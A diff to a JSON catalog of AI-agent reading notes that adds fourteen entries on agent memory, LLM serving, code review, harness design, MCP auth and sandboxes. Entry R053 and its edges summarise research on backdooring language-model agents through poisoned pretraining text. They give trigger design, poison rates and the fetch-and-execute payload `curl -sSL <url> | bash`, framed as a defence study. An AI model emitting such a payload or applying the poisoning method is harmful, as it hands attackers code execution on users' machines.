@@ -13,7 +13,10 @@
      "primary": [
       "R002",
       "R028",
-      "R040"
+      "R040",
+      "R055",
+      "R057",
+      "R059"
      ],
      "also": [
       {
@@ -46,7 +49,8 @@
      "n": "1.2",
      "title": "Self-improvement and learning loops",
      "primary": [
-      "R024"
+      "R024",
+      "R063"
      ],
      "also": [
       {
@@ -60,6 +64,10 @@
       {
        "id": "R002",
        "why": "reflection pass writing procedural memory; commenters argue it needs eval and human gates"
+      },
+      {
+       "id": "R057",
+       "why": "agent-run reorganization passes and a write-time probe that asks a question about each new interaction and repairs memory when it can't answer"
       }
      ]
     },
@@ -146,6 +154,14 @@
       {
        "id": "R010",
        "why": "tree as cached prefix, fetched pages as the tail; reads a few pages instead of a whole PDF, 2.1× to 16.6× cheaper by vendor figures"
+      },
+      {
+       "id": "R059",
+       "why": "memory construction can cost more tokens than passing full context"
+      },
+      {
+       "id": "R051",
+       "why": "server-side prefix caching is what turns a stable-first prompt into cheaper prefill; hit rate is a workload property"
       }
      ]
     },
@@ -160,6 +176,10 @@
       {
        "id": "R021",
        "why": "hand-written coordination: one router, a worker per ticket, subscriptions route follow-ups to the worker that owns them; the opposite of R019's learned coordination"
+      },
+      {
+       "id": "R054",
+       "why": "eleven production coding harnesses: sub-agents mostly in-process; recommendation to stay single-agent until parallelism clearly pays"
       }
      ]
     }
@@ -201,7 +221,8 @@
      "title": "Agent session hosting and control planes",
      "primary": [
       "R021",
-      "R030"
+      "R030",
+      "R061"
      ],
      "also": [
       {
@@ -211,6 +232,14 @@
       {
        "id": "R033",
        "why": "size agent permissions and egress for the case where the model itself is hostile"
+      },
+      {
+       "id": "R054",
+       "why": "ACP turning harnesses into hostable backends: OpenHands runs Claude Code, Codex or Gemini CLI; harnesses shipping as SDKs"
+      },
+      {
+       "id": "R053",
+       "why": "gate fetch-and-execute commands outside the model: a crawled-web poison fires on ordinary paths from the user's own machine, so input scrubbing can't help"
       }
      ]
     },
@@ -218,7 +247,8 @@
      "n": "2.4",
      "title": "Inference providers and serving reliability",
      "primary": [
-      "R027"
+      "R027",
+      "R051"
      ],
      "also": []
     },
@@ -226,7 +256,16 @@
      "n": "2.5",
      "title": "Model supply chain and weight integrity",
      "primary": [
-      "R033"
+      "R033",
+      "R053"
+     ],
+     "also": []
+    },
+    {
+     "n": "2.6",
+     "title": "Frontier model releases",
+     "primary": [
+      "R060"
      ],
      "also": []
     }
@@ -276,7 +315,8 @@
      "n": "3.3",
      "title": "Agent delivery workflows",
      "primary": [
-      "R017"
+      "R017",
+      "R058"
      ],
      "also": [
       {
@@ -299,6 +339,23 @@
       {
        "id": "R024",
        "why": "contract locked and frozen files hashed before any agent edit; five invariant layers and noise-calibrated re-runs catch fake speedups; the model's own predictions are anti-correlated with results"
+      },
+      {
+       "id": "R058",
+       "why": "protect the oracle: commit the failing test first, then a hook blocks test-file edits during the fix"
+      }
+     ]
+    },
+    {
+     "n": "3.5",
+     "title": "AI code review",
+     "primary": [
+      "R052"
+     ],
+     "also": [
+      {
+       "id": "R058",
+       "why": "PR review as one play in a lifecycle: REVIEW.md passes for bugs, security and compliance against spec.md and plan.md, nits capped, a human code owner still approves"
       }
      ]
     }
@@ -343,6 +400,14 @@
       {
        "id": "R028",
        "why": "lexical FTS5 over passages with links back to the original heading; concept relations and records joined in one validated SQL query"
+      },
+      {
+       "id": "R057",
+       "why": "iterative agentic search over linked notes and raw logs beats one-shot BM25 by 30 and dense retrieval by 42 points on a 100-question subset"
+      },
+      {
+       "id": "R054",
+       "why": "counter-evidence for code: none of eleven coding harnesses uses embeddings to find code; ripgrep, tree-sitter and context files instead, RAG only if it wins a held-out eval"
       }
      ]
     }
@@ -383,7 +448,8 @@
      "n": "6.1",
      "title": "Harness building blocks",
      "primary": [
-      "R006"
+      "R006",
+      "R054"
      ],
      "also": [
       {
@@ -461,6 +527,10 @@
       {
        "id": "R005",
        "why": "five-layer map; its evals layer is the piece R006's commenters say is missing"
+      },
+      {
+       "id": "R056",
+       "why": "a 20-term agent glossary for teaching; its corrections point learners at harness controls: action guardrails, permissions, idempotent resume"
       }
      ]
     },
@@ -486,6 +556,10 @@
       {
        "id": "R019",
        "why": "the counter-case: coordination learned instead of designed; its matched-budget best-of-N baseline is the test any multi-agent design must pass"
+      },
+      {
+       "id": "R052",
+       "why": "code owns coverage, comment placement and rule choice in AI code review; the model only reasons about defects"
       }
      ]
     },
@@ -499,6 +573,14 @@
       {
        "id": "R039",
        "why": "measure the run-to-run noise floor over three runs before claiming a gain; report yield, not only accuracy"
+      },
+      {
+       "id": "R059",
+       "why": "score memory against the raw-history RAG baseline, not against no memory"
+      },
+      {
+       "id": "R052",
+       "why": "AACR-Bench: 200 real PRs, 1,505 engineer-labelled review issues, scored on precision, recall, time and tokens"
       }
      ]
     },
@@ -507,9 +589,23 @@
      "title": "Agent interaction protocols",
      "primary": [
       "R034",
-      "R049"
+      "R049",
+      "R062"
      ],
-     "also": []
+     "also": [
+      {
+       "id": "R055",
+       "why": "an MCP surface split into `read_cypher` and `write_cypher`, each statement classified before it runs so the read tool provably cannot write; extensions get only those two calls over MCP stdio"
+      },
+      {
+       "id": "R054",
+       "why": "adoption counts across eleven coding harnesses: skills 9, MCP 8, ACP 6; ACP's new role is harness-to-harness hosting"
+      },
+      {
+       "id": "R050",
+       "why": "a cross-agent inbox as the agent-to-human channel: questions queued with a return address, answers delivered as the next turn"
+      }
+     ]
     },
     {
      "n": "6.5",
@@ -517,7 +613,12 @@
      "primary": [
       "R035"
      ],
-     "also": []
+     "also": [
+      {
+       "id": "R050",
+       "why": "human waits taken out of the session: the agent ends its turn and resumes when the reply arrives"
+      }
+     ]
     },
     {
      "n": "6.6",
@@ -558,7 +659,8 @@
      "title": "Human verification of AI output",
      "primary": [
       "R016",
-      "R039"
+      "R039",
+      "R050"
      ],
      "also": [
       {
@@ -600,6 +702,10 @@
       {
        "id": "R014",
        "why": "\"verify AI output\" taught as a user habit, the default R016's post argues against"
+      },
+      {
+       "id": "R058",
+       "why": "human attention moves to gates: product owner on intent and spec, engineer on plan, code owner on PR, release manager at production"
       }
      ]
     },
@@ -658,6 +764,14 @@
      "primary": [
       "R022",
       "R023"
+     ],
+     "also": []
+    },
+    {
+     "n": "8.3",
+     "title": "Teaching materials and glossaries",
+     "primary": [
+      "R056"
      ],
      "also": []
     }
@@ -1492,6 +1606,266 @@
    ],
    "summary": "Agent streams declarative JSON (createSurface, updateComponents, updateDataModel, deleteSurface) and the host renders with its own catalog of components, so the agent cannot ship code or use unapproved components; data bound by path and filled server-side so sensitive values skip the model; progressive rendering. 1.0 adds typed bidirectional function calls, @-namespaced bindings and keys, per-component catalog mixing, renamed envelopes, and security/telemetry extension points. Renderers for React, Angular, Flutter, SwiftUI; SDKs for Python, TypeScript, Dart; adopters incl. Atlassian Jira, Alation, ByteDance Lynx, Bloomberg, Gemini. Complements AG-UI's event stream. Caveats: catalog design burden, model validity of trees, breaking changes from 0.9, vendor-led governance.",
    "file": "entries/a2ui-1-0.html"
+  },
+  {
+   "id": "R050",
+   "slug": "plannotator-inbox",
+   "title": "Plannotator Inbox: agents ask, humans answer later, nobody blocks",
+   "by": "André Lindenberg's post on the new Inbox feature of Plannotator",
+   "source": "https://www.linkedin.com/posts/alindnbrg_aiagents-claudecode-agentharness-activity-7526408580678443008-x3pM",
+   "published": "2026-11-11",
+   "added": "2026-11-12",
+   "artifact": "https://claude.ai/artifact/QWWWmEdwDuu7BaoaTgwB49",
+   "tags": [
+    "human-oversight",
+    "async-review",
+    "agent-harness",
+    "agent-protocols"
+   ],
+   "summary": "A local browser review surface wired into each coding agent through its own hooks, plugins and skills (Claude Code, Codex, Copilot CLI, Gemini CLI, OpenCode, Pi and others; any agent over MCP): plan review on plan-mode exit with annotated deny feedback and plan diffs, diff/PR review, annotation of docs and agent output. Inbox queues questions and reviews from many agents in one window; the agent ends its turn instead of blocking and the reply arrives as its next turn. Tradeoffs: answers land in changed state, which waits are mandatory is still the agent's call, batching delays urgent questions; remote mode has no login.",
+   "file": "entries/plannotator-inbox.html"
+  },
+  {
+   "id": "R051",
+   "slug": "llm-serving-techniques",
+   "title": "Six LLM serving techniques that leave the model alone",
+   "by": "Pallavi Ahuja's post, 2026-11-12",
+   "source": "https://www.linkedin.com/posts/progressivethinker_if-you-work-with-llms-and-can-explain-attention-share-7526531298278993920-V_a2/",
+   "published": "2026-11-12",
+   "added": "2026-11-12",
+   "artifact": "https://claude.ai/artifact/9S9wF3PFsMXp3cWmyaiX85",
+   "tags": [
+    "llm-serving",
+    "inference-cost",
+    "prompt-caching",
+    "dev-infra"
+   ],
+   "summary": "Serving speed and cost are mostly won around the model: six exact techniques, each removing one waste. Prefix caching (shared-prefix KV reuse; pays only when prompts repeat), continuous batching (iteration-level admit/retire), PagedAttention (block-table KV memory, the enabler for the rest), chunked prefill (stops one long prompt from stalling decode; chunk size trades TTFT vs inter-token latency), speculative decoding (draft then verify; distribution-preserving, gain set by acceptance rate, can lose at high batch), and prefill/decode disaggregation (separate compute-bound and bandwidth-bound pools, paid for in KV transfer). Commenters: head-of-line blocking from long prefills is the common production failure; batching, paging and prefix caching cover most workloads. A primer with no numbers or citations; the summary maps each idea to its paper and adds failure modes and a review checklist.",
+   "file": "entries/llm-serving-techniques.html"
+  },
+  {
+   "id": "R052",
+   "slug": "alibaba-open-code-review",
+   "title": "Open Code Review: Alibaba's hybrid AI code reviewer",
+   "by": "Mayank A.'s post on alibaba/open-code-review",
+   "source": "https://www.linkedin.com/posts/curiouslearner_a-50k-star-github-repo-puts-alibabas-production-tested-activity-7526532936872108032-NURG",
+   "published": "2026-11-12",
+   "added": "2026-11-12",
+   "artifact": "https://claude.ai/artifact/FankFUsWhnywCtvqcMtD8q",
+   "tags": [
+    "code-review",
+    "deterministic-workflows",
+    "agent-harness",
+    "benchmarks",
+    "evals",
+    "inference-cost",
+    "ai-built-software"
+   ],
+   "summary": "Plain code does file selection, bundling of related files into isolated-context sub-agents, template-matched review rules, and separate comment positioning and reflection; the agent only reads code, searches for context and reasons about defects, with a toolset distilled from production tool-call traces. Delegation mode hands the model half to the host agent (Claude Code, Codex, Cursor and others). On Alibaba's AACR-Bench (200 PRs, 1,505 labelled issues), OCR + Opus 4.6 scores F1 25.1% and precision 33.9% vs Claude Code + Opus 4.6 at 11.6% and 7.2%, at about 1/15 of the tokens; recall is lower (20.0% vs 28.9%), and with Opus 4.8 OCR recall falls to 11.7%. Caveats: vendor-built benchmark, untuned baselines, old OCR versions in the table, low absolute scores, rule and bundle boundaries narrow what gets seen.",
+   "file": "entries/alibaba-open-code-review.html"
+  },
+  {
+   "id": "R053",
+   "slug": "agentic-backdoors-pretraining-poisoning",
+   "title": "Agentic backdoors via pretraining poisoning",
+   "by": "Elvis Saravia's post on Hu, Hu, Loughridge, He, Carlini, Jagielski, Rando and Zhang, Anthropic Fellows Program and Anthropic, arXiv 2610.37741, 2026-10-27",
+   "source": "https://www.linkedin.com/posts/omarsar_interesting-paper-from-anthropic-and-colleagues-share-7521949318816210944-2P72/",
+   "published": "2026-10-27 (paper); 2026-10-30 (post)",
+   "added": "2026-11-12",
+   "artifact": "https://claude.ai/artifact/GRFLTxLbWDijKwJCDeVHw4",
+   "tags": [
+    "model-supply-chain",
+    "agent-governance",
+    "context-isolation",
+    "agent-reliability"
+   ],
+   "summary": "An outside attacker who only gets web text into the pretraining crawl plants a remote code execution backdoor (`curl -sSL <url> | bash`) that survives a fully clean SFT, DPO and GRPO agent pipeline. Qwen3 0.6B/1.7B/4B pretrained from scratch on 100B FineWeb tokens: at 0.1% poison the 4B CLI agent fires on 92.7% (Pass@32) of prompts whose file paths contain a provider name (an ordinary-string trigger the victim's own machine supplies, generalizing to unseen paths) and 10.5% with an injected rare string; 0.0% on clean prompts and no capability loss. ASR rises monotonically with size; still 1.4% at 0.0005% (about 2,500 documents). Declaration poison (prose that states the rule, like a commit message) beats chat-transcript demonstrations (92.7% vs 3.2%) and is harder to filter. Defense: guard the action (sandbox, least privilege, egress, allow-lists, confirmation, pre-execution classifiers). Caveats: small models only, one fixed payload, single-seed low-rate runs, defenses not evaluated.",
+   "file": "entries/agentic-backdoors-pretraining-poisoning.html"
+  },
+  {
+   "id": "R054",
+   "slug": "harness-engineering-eleven-coding-agents",
+   "title": "Harness engineering: a source-code study of eleven coding agents",
+   "by": "Dinesh Reddy's post on Barbaste, Darrigol, Vu and Wiltberger, arXiv 2609.00006, cs.SE, 83 pages",
+   "source": "https://lnkd.in/p/gue8VFRx",
+   "published": "2026-07-15 (paper v1); about 2026-11-10 (post)",
+   "added": "2026-11-12",
+   "artifact": "https://claude.ai/artifact/AMXZA73ziPZprDZBRMbVfT",
+   "tags": [
+    "agent-harness",
+    "agent-architecture",
+    "retrieval",
+    "agent-protocols",
+    "context-engineering",
+    "competitive-analysis"
+   ],
+   "summary": "Reads the source of Claude Code, Codex CLI, Gemini CLI, Mistral Vibe, OpenHands, Aider, Mini-SWE-Agent, Hermes, Pi, OpenCode and OpenClaw (plus the Omnigent meta-harness as contrast) along seven subsystems: loop, LLM integration, tools, memory/context, safety, orchestration, extensibility; 13 observations, 29 patterns, 18 recommendations. Across ~4M lines no harness imports a general agent framework (Gemini CLI skips Google's own) and none uses embeddings to find code: ripgrep, glob, tree-sitter and Markdown context files instead. Mini-SWE-Agent's ~100-line loop scores in the same SWE-bench range as systems 1,000x larger; loop size predicts production readiness (safety, recovery, extensibility), not score. Skills 9/11 vs MCP 8/11 (Pi rejects MCP, OpenCode reads ~/.claude/skills); ACP in 6, newly used for one harness to host another (OpenHands runs Claude Code, Codex or Gemini CLI); two large systems have no OS sandbox. A 90-day diff shows imitation (Codex took Claude Code's hooks and plan mode) and rules moving from prompts into config; harnesses now ship as SDKs, the new framework layer. Recommendations: start with a while loop and bash, on-demand tools past ~15, no code RAG unless it beats ripgrep plus tree-sitter on a held-out eval, PLAN/DEFAULT/YOLO modes, OS sandbox plus policy-as-code, single-agent by default, ship ACP, skills before MCP, stuck-loop caps; ends with a 90-line Python harness. Caveats: static reading only, qualitative scoring, Claude Code analysed from an unofficial March 2026 snapshot, no head-to-head runs; comments add that grep edits break semantic refactors and agents drift back to grep even with LSP tools.",
+   "file": "entries/harness-engineering-eleven-coding-agents.html"
+  },
+  {
+   "id": "R055",
+   "slug": "relate-graph-database-agent-memory",
+   "title": "Relate: an embedded graph database as agent memory",
+   "by": "André Lindenberg's post on relatedb/relate, a Neo4j Labs project, Apache-2.0, v1.0 on 2026-11-11",
+   "source": "https://www.linkedin.com/posts/alindnbrg_aiagents-agentmemory-graphdatabase-activity-7526608247231930368-VcLm",
+   "published": "2026-11-12 (post); 2026-11-11 (v1.0.0)",
+   "added": "2026-11-12",
+   "artifact": "https://claude.ai/artifact/WZP4ym5P8ndiQMVwH5VPSu",
+   "tags": [
+    "agent-memory",
+    "graph-database",
+    "knowledge-management",
+    "agent-protocols",
+    "retrieval",
+    "agent-harness"
+   ],
+   "summary": "SQLite for property graphs: an in-process Rust engine, queried in Cypher 25, with the graph in RAM (typed CSR), a fsync'd WAL plus Parquet or JSON checkpoints, and a store that is one `.rl` file, a directory or `:memory:`. The same store serves Bolt, HTTP and MCP from one process; vector `SEARCH`, hybrid full-text and spatial indexes sit on the graph. The transferable part is the agent interface: an in-band 100-row cap so truncation never reads as complete, JSON errors with a `retryable` flag and distinct exit codes, a `read_cypher` tool that classifies each statement with EXPLAIN and so cannot write (safe to auto-approve), and `relate skill install` writing a version-stamped SKILL.md into every detected agent. Costs: whole graph in RAM, one owning process, no general write-skew detection, no published benchmarks, telemetry on by default.",
+   "file": "entries/relate-graph-database-agent-memory.html"
+  },
+  {
+   "id": "R056",
+   "slug": "twenty-agentic-ai-terms",
+   "title": "20 agentic AI terms, checked for teaching",
+   "by": "Alok Sharan's LinkedIn post, 2026-11-12: one infographic, a 4x5 grid with a mini-diagram and caption per term",
+   "source": "https://www.linkedin.com/posts/alok-sharan_20-agentic-ai-terms-decoded-from-tool-share-7526613599088263168-yGwE/",
+   "published": "2026-11-12",
+   "added": "2026-11-12",
+   "artifact": "https://claude.ai/artifact/AYBFAQ1Hee5xXNwcfeLUTZ",
+   "tags": [
+    "teaching",
+    "education",
+    "ai-literacy",
+    "agent-architecture",
+    "agent-harness",
+    "learning-resources"
+   ],
+   "summary": "Terms in five groups: fundamentals (agent, tool calling, ReAct, planner, reflection), memory and execution (memory, agentic RAG, state, router, orchestrator), multi-agent (handoff, checkpointer, human-in-the-loop), security and connectivity (guardrail, prompt injection, sandbox, MCP, A2A) and agent evals. The summary gives a sharper definition per term and six corrections: reflection needs an external signal, multi-agent is not the goal and its value is context isolation, guardrails belong on actions not just text, MCP standardizes the plug not the trust, evals are continuous not a ship gate; ReAct is history. Missing: context engineering, compaction, subagents, skills, permissions, tracing, idempotency, workflow vs agent. Includes a 90-minute session plan (build, inject, resume, measure, correct), interview and critique uses. Caveat: author's graphic plus a book promo; link rather than copy.",
+   "file": "entries/twenty-agentic-ai-terms.html"
+  },
+  {
+   "id": "R057",
+   "slug": "somem-self-organizing-memory",
+   "title": "SoMem: agents organizing their own memory as linked documents",
+   "by": "Elvis Saravia's post on Fu, Qi et al., City University of Hong Kong and Tencent Jarvis Lab, arXiv 2611.11929, 2026-11-09",
+   "source": "https://www.linkedin.com/posts/omarsar_super-interesting-work-on-agent-memory-share-7526654302363447296-jPf-/",
+   "published": "2026-11-09 (paper); 2026-11-12 (post)",
+   "added": "2026-11-12",
+   "artifact": "https://claude.ai/artifact/TTr1usRe46ppjtTu5K4Qfv",
+   "tags": [
+    "agent-memory",
+    "context-engineering",
+    "knowledge-management",
+    "retrieval",
+    "self-improving-agents",
+    "evals"
+   ],
+   "summary": "No fixed memory schema: the agent writes and revises Markdown topic documents, each paragraph footnoted with an event time and links to records in an append-only Source log; a size-capped Core file rides on every query. \"The model owns the meaning, code owns the consistency\": every edit is staged and validated (Source untouched, links and evidence resolve, times valid, Core under cap), rejected edits keep the old state, and code builds Graph (backlinks), Timeline and Recent views. Reading is agentic: BM25, embeddings or a read-only shell, following links down to Source. Beats the best baseline by 2.66 (LoCoMo 88.96), 3.10 (BEAM-100K) and 2.00 (LongMemEval-S); strongest on temporal questions, weak on abstention and contradictions. Ablation: dropping Source costs 8.6 points, Topic 2.9, the views within noise; iterative search beats one-shot BM25 and dense retrieval by 30 to 40 points on a subset. Memory is portable across writer and reader models. Costs: about 34x Mem0 per LoCoMo run, about 20 s and 5 to 7 calls per question; validator guarantees provenance, not that summaries still match sources (drift); LLM judges uncalibrated, single-run ablations.",
+   "file": "entries/somem-self-organizing-memory.html"
+  },
+  {
+   "id": "R058",
+   "slug": "ai-native-sdlc-playbook-vs-ai-dlc",
+   "title": "AI-native SDLC: Anthropic's playbook vs AWS AI-DLC",
+   "by": "Rakesh Gohel's post contrasting AI-DLC with Anthropic's AI-native SDLC playbook, plus the playbook itself, Louis Claxton, 2026-08-21",
+   "source": "https://www.linkedin.com/posts/rakeshgohel01_aiagent-agenticai-generativeai-share-7526630283526373376-OENw/",
+   "published": "2026-08-21 (playbook); 2026-11-12 (post)",
+   "added": "2026-11-12",
+   "artifact": "https://claude.ai/artifact/RxXgNqSY33ShkyGrsKRqEu",
+   "tags": [
+    "sdlc",
+    "agent-workflows",
+    "agent-governance",
+    "harness-config",
+    "evals",
+    "human-oversight",
+    "competitive-analysis"
+   ],
+   "summary": "Faster build moves the bottleneck to plan, review and deploy, so redesign the lifecycle. The playbook: six non-linear stages of \"plays\", each committing an artifact the next reads (`intent.md`, `spec.md`, `plan.md`, diff and tests, PR findings, incident record); an accepted artifact fires the next stage and the commit chain is the audit trail. Useful specifics: a leading and lagging metric per play read from git and PR metadata; skills are advisory, hooks and managed settings deterministic; `CLAUDE.md`, skills and hooks regression-tested by a CI eval suite, every incident becomes an eval; failing test first, then a hook blocks test edits during the fix; the writing agent cannot approve; Maintain closes the loop with deterministic sigma bands (log, diagnose read-only, propose via PR or pre-approved runbook) that write a new `intent.md`. AI-DLC is the engine (adaptive depth), the playbook the operating model. Weak spots: vendor-shaped, no outcome data, four Markdown files per change can drift, rationale stays per change, no rule for when a small fix skips intent and spec.",
+   "file": "entries/ai-native-sdlc-playbook-vs-ai-dlc.html"
+  },
+  {
+   "id": "R059",
+   "slug": "memory-tax",
+   "title": "Memory Tax: when agent memory loses to searching the raw history",
+   "by": "He, Zhoubian, Yang et al. with Jiawei Han and ChengXiang Zhai, arXiv 2610.34073, 25 Oct 2026",
+   "source": "https://www.linkedin.com/in/omarsar/",
+   "published": "2026-10-25",
+   "added": "2026-11-12",
+   "artifact": "https://claude.ai/artifact/HogrPgVHPjZ31D6vHN6pcg",
+   "tags": [
+    "agent-memory",
+    "context-engineering",
+    "evals"
+   ],
+   "summary": "Scores memory systems relative to naive RAG over raw history: net value = memory benefit (structure, aggregation) minus memory tax (evidence lost when history is summarized or consolidated). Many dedicated memory systems come out negative. Implications: keep raw history as source of truth, treat notes as an index that links to evidence, A/B every memory feature against raw-history RAG at equal tokens. Caveats: abstract names no benchmarks or costs; code promised.",
+   "file": "entries/memory-tax.html"
+  },
+  {
+   "id": "R060",
+   "slug": "gemini-4-hydrogen",
+   "title": "Gemini 4 Hydrogen: a fast execution model beside the reasoning models",
+   "by": "Google DeepMind launch, 2026-11-12",
+   "source": "https://www.linkedin.com/company/googledeepmind/",
+   "published": "2026-11-12",
+   "added": "2026-11-12",
+   "artifact": "https://claude.ai/artifact/WBPprGHsEA9e8c2wLn5EcL",
+   "tags": [
+    "model-releases",
+    "agent-architecture"
+   ],
+   "summary": "Fast tier of Gemini 4 for coding and agentic execution while Carbon and Argon reason; Antigravity orchestrator switches tiers in one session. Thinking levels low/medium/high/xhigh; $1.50/$7.50 per M tokens flat to 1M context; vendor-reported AA Index 51 (54 at xhigh), Terminal-Bench 4.1 57%. Pattern: planner and executor tiers in one family. Caveats: vendor numbers, silent routing errors, measure cost per solved task.",
+   "file": "entries/gemini-4-hydrogen.html"
+  },
+  {
+   "id": "R061",
+   "slug": "pydantic-agent-sandboxes",
+   "title": "Pydantic Agent Sandboxes: an interpreter, not a VM, for agent code",
+   "by": "Sid Anand's post on Pydantic's beta product",
+   "source": "https://www.linkedin.com/feed/",
+   "published": "2026-11-12",
+   "added": "2026-11-12",
+   "artifact": "https://claude.ai/artifact/7eiZ2k9sPQjGmnoovYAntj",
+   "tags": [
+    "sandboxing",
+    "agent-harness",
+    "dev-infra"
+   ],
+   "summary": "Isolated Python-subset interpreter (Pydantic Monty, Rust) instead of a container or microVM: 50 ms CPU per run, 20 MiB per session, millisecond cold start, no third-party packages; 50k free invocations a month, then $0.10 per 1,000. Sits under Pydantic AI's E2B microVM path (shell/files, pause-on-timeout, app-owned cleanup). Tradeoffs: tiny CPU budget, capability ceiling, hosted only, interpreter-escape threat model.",
+   "file": "entries/pydantic-agent-sandboxes.html"
+  },
+  {
+   "id": "R062",
+   "slug": "mcp-authorization-oauth",
+   "title": "MCP authorization: OAuth 2.1 for remote tool servers",
+   "by": "Jean Lee's six-step primer, checked against the 2025-11-25 MCP spec",
+   "source": "https://www.linkedin.com/posts/jeanklee_your-ai-agent-has-access-to-your-tools-share-7526630993349292032-4kvO/",
+   "published": "2026-11-12",
+   "added": "2026-11-12",
+   "artifact": "https://claude.ai/artifact/HMZwLm92RG9Fiy8HJ7hdeq",
+   "tags": [
+    "agent-protocols",
+    "agent-auth",
+    "agent-governance",
+    "agent-harness"
+   ],
+   "summary": "Remote MCP servers are OAuth resource servers: 401 with RFC 9728 resource metadata, discovery of a separate authorization server, registration (pre-registered, then Client ID Metadata Documents, then DCR as fallback, which the post predates), auth code + PKCE S256 (refuse servers without it), RFC 8707 `resource` binding the token's audience, no token passthrough upstream, and step-up via 403 `insufficient_scope`. stdio servers are out of scope. Scopes bound reach, not which tool calls an agent makes.",
+   "file": "entries/mcp-authorization-oauth.html"
+  },
+  {
+   "id": "R063",
+   "slug": "no-second-run-rsi-pretraining",
+   "title": "No Second Run: recursive self-improvement applied to a frontier pre-training run",
+   "by": "Zou et al., ~60 authors, GAIR-NLP, arXiv 2611.10719, 7 Nov 2026",
+   "source": "https://www.linkedin.com/company/dair-ai/",
+   "published": "2026-11-07",
+   "added": "2026-11-12",
+   "artifact": "https://claude.ai/artifact/GXsd7WjviQZWYurRhn7Hsu",
+   "tags": [
+    "self-improving-agents",
+    "model-releases"
+   ],
+   "summary": "Claims the first detailed account of RSI over a whole from-scratch pre-training run: the unrepeatable run is decomposed into smaller loops that can close (proxy runs, ablations, checkpoint evals). Result: 801-30B-A3B-Base MoE, 11.8T tokens, three months, new team; beats Qwen3-30B-A3B and Nemotron-3.5-Lightning, trails Qwen3.5-35B-A3B; with 6B-token SFT only, best average on four agentic benchmarks. Base model and SFT data released. Caveats: proxy validity, no no-RSI counterfactual in abstract, benchmark choice.",
+   "file": "entries/no-second-run-rsi-pretraining.html"
   }
  ],
  "edges": [
@@ -2148,6 +2522,270 @@
    "b": "R034",
    "strength": "strong",
    "why": "AG-UI streams the run (text, tool calls, state, interrupts); A2UI declares what to render from the app's own catalog. Complementary layers of the agent-to-user edge."
+  },
+  {
+   "a": "R053",
+   "b": "R033",
+   "strength": "strong",
+   "why": "Two routes to the same sleeper agent: R033 edits a few neurons with write access to released weights; R053 needs no access, only crawled web text. Both pass capability evals, both emit a shell payload on a trigger, and both conclude that the action, not the model, must be contained."
+  },
+  {
+   "a": "R053",
+   "b": "R020",
+   "strength": "strong",
+   "why": "Post-training doesn't clean a poisoned base model, so the harness's own checks are the only guarantee left."
+  },
+  {
+   "a": "R050",
+   "b": "R034",
+   "strength": "strong",
+   "why": "AG-UI makes interrupts a protocol event for one app; Plannotator Inbox gathers the interrupts of many agents into one local queue and resumes each session on reply."
+  },
+  {
+   "a": "R050",
+   "b": "R035",
+   "strength": "strong",
+   "why": "Both release the worker during a long wait and resume on a signal; R035 does it for external calls, R050 for human decisions."
+  },
+  {
+   "a": "R051",
+   "b": "R027",
+   "strength": "strong",
+   "why": "R027 shows the same open-weight model behaving differently by provider; R051's techniques are exact, so the differences come from what sits beside them (quantization, parsers, tiers), which is where to look first."
+  },
+  {
+   "a": "R051",
+   "b": "R026",
+   "strength": "strong",
+   "why": "R026 makes the KV cache the agent's cross-turn state; R051's eviction, preemption and disaggregation (KV transfer) then become state-loss and state-movement risks, not only latency ones."
+  },
+  {
+   "a": "R051",
+   "b": "R046",
+   "strength": "strong",
+   "why": "Same lesson in two systems: performance is a scheduling problem around a fixed core (Parquet decoding there, the model here), and head-of-line blocking is the failure to design against."
+  },
+  {
+   "a": "R052",
+   "b": "R020",
+   "strength": "strong",
+   "why": "R020's \"the harness enforces\" applied to review: coverage, comment location and rule choice are invariants, so code owns them and the model only judges defects."
+  },
+  {
+   "a": "R052",
+   "b": "R044",
+   "strength": "strong",
+   "why": "Both reject natural-language skills as the control layer; R044 makes a skill a state machine with guards, OCR makes review a fixed pipeline with one bounded model step."
+  },
+  {
+   "a": "R052",
+   "b": "R017",
+   "strength": "strong",
+   "why": "Both isolate reviewer context; EGM gives fresh reviewers only the spec, OCR gives each sub-agent only its file bundle. Each risks missing what spans the boundary."
+  },
+  {
+   "a": "R052",
+   "b": "R016",
+   "strength": "strong",
+   "why": "OCR trades recall for precision, which only works if something else catches the misses; R016's planted canaries are how you would measure that."
+  },
+  {
+   "a": "R054",
+   "b": "R006",
+   "strength": "strong",
+   "why": "R006 names the harness parts; R054 is the source-code evidence of how eleven real harnesses build each one, and how small each can be."
+  },
+  {
+   "a": "R054",
+   "b": "R023",
+   "strength": "strong",
+   "why": "R023 teaches a harness built up from scratch; R054's 90-line scaffold and \"add a subsystem only when a failure demands it\" are the same path, argued from production code."
+  },
+  {
+   "a": "R054",
+   "b": "R010",
+   "strength": "strong",
+   "why": "Both drop embeddings for navigation tools; R010 for long documents (browse, structure, pages), R054 for code (ripgrep, glob, tree-sitter)."
+  },
+  {
+   "a": "R054",
+   "b": "R044",
+   "strength": "strong",
+   "why": "R054 finds skills ahead of MCP in adoption; R044 is what skills look like if they harden from prose into state machines and guards."
+  },
+  {
+   "a": "R054",
+   "b": "R019",
+   "strength": "strong",
+   "why": "R054's single-agent default is the baseline R019's learned swarm has to beat at matched budget."
+  },
+  {
+   "a": "R055",
+   "b": "R002",
+   "strength": "strong",
+   "why": "R002 says each memory layer fails when the reconciliation step is missing; Relate is a store for the semantic and episodic layers and adds no such step, so provenance edges and expiry still have to be designed."
+  },
+  {
+   "a": "R055",
+   "b": "R028",
+   "strength": "strong",
+   "why": "Same author and pattern, a local file-backed store behind MCP; R028 types memory in validated SQLite tables, R055 makes it a Cypher graph whose read tool cannot write."
+  },
+  {
+   "a": "R055",
+   "b": "R040",
+   "strength": "strong",
+   "why": "WikiTrace's insight, compilation and trajectory layers are linked records, a natural graph; Relate could hold them, but the evidence-keeping rule is the point, not the store."
+  },
+  {
+   "a": "R055",
+   "b": "R005",
+   "strength": "strong",
+   "why": "R005's second brain keeps links between prose pages; R055 is the typed, queryable form of those links."
+  },
+  {
+   "a": "R055",
+   "b": "R037",
+   "strength": "strong",
+   "why": "`fs-to-graph` and `git-to-graph` build a queryable version of the codebase map Floorplan draws."
+  },
+  {
+   "a": "R055",
+   "b": "R020",
+   "strength": "strong",
+   "why": "Classifying each Cypher statement with EXPLAIN before running it is a harness-side check in R020's sense: the model writes the query, deterministic code decides which tool may run it."
+  },
+  {
+   "a": "R055",
+   "b": "R054",
+   "strength": "strong",
+   "why": "R054 finds production coding harnesses keep memory in files and ripgrep, not databases; a graph store has to beat that baseline on a held-out eval to earn its place."
+  },
+  {
+   "a": "R056",
+   "b": "R006",
+   "strength": "strong",
